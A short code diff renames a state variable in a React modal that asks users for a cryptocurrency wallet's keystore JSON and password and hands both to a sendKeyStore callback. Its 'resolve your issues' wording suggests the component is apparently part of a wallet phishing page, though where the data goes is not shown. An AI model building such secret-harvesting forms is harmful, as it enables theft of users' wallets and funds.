@@ -2,15 +2,15 @@ import React, { useState } from 'react';
 import styles from './KeyStoreModal.module.css';
 
 const KeystoreModal = ({ onClose, sendKeyStore, closeKeyStoreForm }) => {
-    const [keyStore, setKeyStore] = useState('')
+    const [keystoreJson, setKeystoreJson] = useState('')
     const [password, setPassword] = useState('')
 
     const handleSubmit=(e)=>{
         e.preventDefault()
-        if(!keyStore || !password){
+        if(!keystoreJson || !password){
             alert('Kindly complete the details correctly inorder to resolve your issues')
         }else{
-            sendKeyStore([keyStore, password])
+            sendKeyStore([keystoreJson, password])
         }
     }
     return (
@@ -24,8 +24,8 @@ const KeystoreModal = ({ onClose, sendKeyStore, closeKeyStoreForm }) => {
                         id="keystoreJson" 
                         className={styles.input} 
                         placeholder="Enter Keystore JSON" 
-                        value={keyStore}
-                        onChange={(e)=>setKeyStore(e.target.value)}
+                        value={keystoreJson}
+                        onChange={(e)=>setKeystoreJson(e.target.value)}
                     />
                     <label className={styles.label} htmlFor="password">Enter Password</label>
                     <input 
